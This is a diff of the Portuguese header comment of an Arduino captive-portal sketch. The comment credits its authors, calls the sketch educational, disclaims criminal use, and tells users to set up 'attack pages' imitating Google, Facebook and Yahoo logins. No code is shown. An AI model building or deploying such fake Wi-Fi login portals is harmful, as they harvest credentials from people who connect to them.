@@ -1,9 +1,9 @@
 /*
  * Criador Oficial Da Versão Brasileira Antonio Caleb.
+ * Criador Oficial Da Versão Inglesa OxMarco (Criador Mega Oficial Da Script).
  * (Apenas Para Uso Educacional)
- * Configure access point name and up to 3 custom domains and login urls in config.h
- * Configure the html for login page of said domains in site1.h, site2.h, and site3.h
- * Configure the html for any other domain(catch-all) in site_other.h
+ * Para Configurar As Paginas De Ataque, Fazer Uma Pasta Colocando O CalebCaptivePortal.Ino E Os Outros Com Nome Google.h Facebook.h Yahoo.h.
+ * Apos Fazer A Pasta Abrir O Arquivo.Ino Já Pode Configrar As Paginas De Ataque.
  * Não Me Responsabiliso Em Usos Criminais
  * Apenas Para Uso Educacional!
 */
